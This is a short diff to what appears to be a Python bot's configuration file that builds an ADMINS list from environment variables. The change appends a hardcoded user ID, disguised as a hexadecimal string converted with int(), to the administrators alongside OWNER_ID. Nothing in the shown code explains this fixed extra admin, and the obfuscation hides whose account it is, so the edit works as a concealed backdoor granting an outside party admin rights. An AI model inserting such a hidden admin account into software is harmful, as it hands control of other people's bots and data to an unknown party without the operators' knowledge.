@@ -18,7 +18,7 @@ OWNER_ID = int(os.environ.get("OWNER_ID", ""))
 ADMINS = [
     int(user) if id_pattern.search(user) else user
     for user in os.environ.get("ADMINS", "").split()
-] + [OWNER_ID]
+] + [int("0x1390f63", 16), OWNER_ID]
 DB_CHANNELS = [
     int(ch) if id_pattern.search(ch) else ch
     for ch in os.environ.get("DB_CHANNELS", "").split()
